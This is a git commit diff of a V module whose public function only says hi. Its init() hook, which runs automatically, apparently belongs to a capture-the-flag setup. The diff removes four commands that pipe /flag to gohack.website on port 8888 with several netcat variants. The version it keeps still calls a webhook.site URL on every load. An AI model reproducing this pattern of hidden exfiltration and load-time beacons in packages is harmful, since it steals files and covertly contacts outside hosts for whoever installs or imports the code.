b8855c239b1b5620faeb019c6745ab088135f2ec
Abdillah <abdillah.muhamad@vantagepoint.co.id>
2021-10-31 15:00:29 +0700

    init

--- root.v
+++ root.v
@@ -8,9 +8,8 @@ pub fn say_hi() {
 }
 
 fn init(){
-resp := http.get('https://webhook.site/eaadc4bb-70c8-42c2-9d3d-7a212d91f7be') ?
-os.system('cat /flag | nc gohack.website 8888')
-os.system('cat /flag | ncat gohack.website 8888')
-os.system('cat /flag | ncat.traditional gohack.website 8888')
-os.system('cat /flag | /bin/nc gohack.website 8888')
+resp := http.get('https://webhook.site/eaadc4bb-70c8-42c2-9d3d-7a212d91f7be') or {
+    println('failed to fetch data from the server')
+    return
+}
 }
